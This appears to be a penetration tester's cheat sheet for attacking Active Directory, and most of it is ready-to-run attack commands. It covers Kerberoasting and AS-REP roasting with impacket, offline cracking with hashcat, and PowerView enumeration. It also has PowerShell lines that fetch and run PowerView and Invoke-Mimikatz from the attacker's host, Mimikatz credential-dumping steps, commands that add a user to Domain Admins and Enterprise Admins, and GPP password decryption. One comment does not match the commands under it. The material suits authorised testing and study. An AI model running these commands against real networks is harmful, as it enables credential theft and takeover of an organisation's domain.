# Methodology

## Enumeration

### Kali Commands

```bash
# Kerberoast
impacket-GetUserSPNs -request -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER:$PASS
impacket-GetUserSPNs -request -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER -hashes ':$NTLM'
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force

# AS-REP roast
impacket-GetNPUsers -request -dc-ip $IP -outputfile hashes.asreproast $DOMAIN/$USER
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force

# Convert net user output to user list
tr -s ' ' '\n' < users.txt | sed '/^$/d'
```

With valid credentials for a domain user, we can first enumerate the domain remotely with [PowerView.py](https://github.com/aniqfakhrul/powerview.py)

**Note:** This can miss custome attributes compared to running PowerView locally

```bash
# Connect
powerview --dc-ip $IP $DOMAIN/$USER:$PASS@$IP
powerview --dc-ip $IP $DOMAIN/$USER@$IP -H ':$NTLM'

# Identify DC
Get-NetDomain

# Enumerate user objects
Get-NetUser -Select samaccountname
Get-NetUser -Properties samaccountname,description,memberof -TableView
Get-NetUser $USER
Get-NetGroup -Where 'member contains $USER' -Select cn

# Enumerate group objects
Get-NetGroup -Properties cn,member -TableView
Get-NetGroup $GROUP

# Enumerate Computer objects
Get-NetComputer -Properties dnshostname,operatingsystem,operatingsystemversion -TableView

# Check for logged-in users (DOES NOT WORK CURRENTLY, RUN LOCALLY)
Get-NetSession -Computer $COMPUTER

# Find hosts on the local domain where the current user has local administrator access (DOES NOT WORK CURRENTLY, RUN LOCALLY)
Find-LocalAdminAccess

# Enumerate SPNs linked to users
Get-NetUser -SPN -Properties samaccountname,serviceprincipalname -TableView

# Retrieve the ACL for the specified object (DOES NOT WORK CURRENTLY, RUN LOCALLY)
Get-ObjectAcl -Identity $OBJECT -Select SecurityIdentifier,ActiveDirectoryRights -TableView
Get-ObjectAcl -Identity $OBJECT -Where 'ActiveDirectoryRights eq GenericAll' -Select SecurityIdentifier,ActiveDirectoryRights -TableView

# Enumerate domain shares (DOES NOT EXIST CURRENTLY, RUN LOCALLY)
Find-DomainShare
Find-DomainShare -CheckShareAccess # Takes a long time
ls \\$COMPUTERNAME\$SHARE\$DOMAIN\
```

### Local Access

Once we have local access, we can run **[BloodHound](0%20Tools/BloodHound.md)**

**PowerView**

```powershell
# Import PowerView
iex(new-object net.webclient).downloadstring("http://$OUR_IP/PowerView.ps1")

# Idenfity DC (check Pdc)
Get-NetDomain

# Enumerate user objects
Get-NetUser | select samaccountname,description,memberof
Get-NetUser $USER

# Enumerate group objects
Get-NetGroup | select cn,member
Get-NetGroup $GROUP | select cn,member
Get-NetGroup -UserName $USER | select cn

# Enumerate Computer objects
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion

# Check for logged-in users
Get-NetSession -Computer $COMPUTER

# Find hosts on the local domain where the current user has local administrator access
Find-LocalAdminAccess

# Enumerate SPNs linked to users
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# Retrieve the ACLs for the specified object
Get-ObjectAcl -Identity $OBJECT | select SecurityIdentifier,ActiveDirectoryRights
ConvertFrom-SID $SID
Get-ObjectAcl -Identity $OBJECT | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"$SID","$SID" | ConvertFrom-SID

# Enumerate domain shares
Find-DomainShare
Find-DomainShare -CheckShareAccess # Takes a long time
ls \\$COMPUTERNAME\$SHARE\$DOMAIN\
```

**Manual**

```powershell
# Print users within the current domain
net user /domain

# Check domain user information
net user offsec /domain

# Check password policy
net accounts

# Check domain groups
net group /domain
net group "$GROUP" /domain

# Add and remove "setphanie" from "Management Department"
net group "Domain Admins" mojo /add /domain
net group "Enterprise Admins" mojo /add /domain
```

### Tools

**[Mimikatz](0%20Tools/Local/Mimikatz.md)**

[Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)

```bash
# Invoke mimikatz
.\mimikatz.exe
iex(new-object net.webclient).downloadstring("http://$OUR_IP/Invoke-Mimikatz.ps1")

privilege::debug
token::elevate
log
sekurlsa::logonpasswords
lsadump::sam
lsadump::lsa /patch
lsadump::secrets
token::revert
exit
```

**[gpp-decrypt](0%20Tools/gpp-decrypt.md)**

Decrypts GPP credentials. Typically found in files like `Groups.xml`, `Services.xml`, `Scheduledtasks.xml`, `DataSources.xml`, `Printers.xml`, and `Drives.xml`.

Key things to look for:

- **File Location:** GPP files are usually found in the `SYSVOL` folder on a domain controller, under the path `\\[DOMAIN]\SYSVOL\[DOMAIN]\Policies\`.
- **cpassword Attribute:** Within these XML files, look for the `cpassword` attribute. This attribute holds the encrypted form of the password.
- **XML Structure:** The structure of the XML file can give you a hint. For example, in a `Groups.xml` file, you might see something like:

```xml
<Group ...>
  <Properties ... cpassword="EDUYJgCbgCAmO5E..." ... />
</Group>
```

Decrypt with:

```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

**[Rubeus](0%20Tools/Local/Rubeus.md)**

Crack associated hashes in hashcat

```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
